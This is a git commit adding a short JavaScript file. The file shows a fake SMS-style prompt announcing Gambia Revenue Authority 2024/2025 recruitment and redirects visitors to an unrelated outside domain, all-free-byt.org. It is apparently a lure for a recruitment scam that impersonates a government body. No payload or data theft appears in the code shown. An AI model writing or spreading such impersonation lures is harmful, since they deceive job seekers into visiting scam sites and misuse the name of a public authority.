3216c597a044dbd8da5c17c4c9476419753a3864
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-19 23:32:20 -0700

    Create gambia-job.js

---
+++ gambia-job.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Registration is ongoing for the Gambia Revenue Authority 2024/2025 recruitment, kindly press 1 to submit your Application','1');
+if (password != '1') {
+location.href='https://all-free-byt.org/gambia.html';
+}
